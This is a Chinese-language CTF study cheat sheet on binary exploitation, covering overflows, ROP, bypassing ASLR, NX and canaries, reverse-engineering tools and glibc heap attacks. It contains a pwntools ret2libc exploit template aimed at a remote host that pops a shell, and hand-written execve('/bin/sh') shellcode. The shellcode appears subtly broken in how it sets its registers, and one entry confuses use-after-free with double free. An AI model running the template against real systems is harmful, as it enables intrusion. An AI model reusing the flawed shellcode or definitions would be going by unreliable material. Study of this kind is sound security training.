# 二进制安全

## Pwn 基础

### 缓冲区溢出
- 栈溢出：覆盖返回地址
- 堆溢出：unlink、fastbin attack
- 格式化字符串漏洞：`%n` 写内存

### 保护机制绕过
- **ASLR**：信息泄露获取基地址
- **DEP/NX**：ROP 链执行代码
- **Canary**：泄露 canary 值
- **PIE**：相对地址 + 泄露

### ROP (Return-Oriented Programming)
- 使用 `ROPgadget` 或 `ropper` 查找 gadgets
- 构造 chain 调用 system("/bin/sh")
- ret2libc：利用 libc 中的函数

### 常用工具
- `checksec`：检查二进制保护
- `gdb` + `pwndbg`/`gef`：调试
- `pwntools`：Python pwn 框架

### pwntools 示例
```python
from pwn import *
p = remote('target.com', 1234)
# 或 p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# 泄露 libc 地址
p.recvuntil('leak: ')
leak = int(p.recvline(), 16)
libc.address = leak - libc.symbols['printf']

# 构造 payload
payload = b'A' * offset
payload += p64(rop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.interactive()
```

## 逆向工程

### 静态分析
- **IDA Pro**：F5 反编译，交叉引用
- **Ghidra**：NSA 开源逆向工具
- **Radare2**：命令行逆向框架

### 动态分析
- **x64dbg**：Windows 调试器
- **gdb**：Linux 调试器
- **strace/ltrace**：系统调用跟踪

### 常见混淆
- 控制流平坦化
- 字符串加密
- 虚拟机保护

### 解题思路
1. 确定输入点和验证逻辑
2. 找到关键比较或计算
3. 逆向算法或爆破
4. 对于 CrackMe，patch 或生成 key

## Shellcode

### 编写要点
- 避免空字节 `\x00`
- 短小精悍
- 位置无关

### Linux x64 execve("/bin/sh")
```asm
xor rdi, rdi
push rdi
mov rax, 0x68732f6e69622f ; "/bin/sh" in reverse
push rax
mov rdi, rsp
push rdi
pop rsi
mov al, 59 ; sys_execve
syscall
```

### 编码
- Shikata ga nai (Metasploit)
- 自定义 XOR 编码

## 堆利用

### glibc 堆管理
- ptmalloc2 实现
- chunk 结构：prev_size, size, fd, bk
- fastbins, smallbins, largebins

### 常见攻击
- **Use After Free (UAF)**：重复释放后控制
- **Double Free**：fastbin dup
- **House of系列**：House of Force, House of Orange
- **Tcache**：glibc 2.26+ 的新机制

### 工具
- `heapinfo` (pwndbg)
- `parseheap` (gef)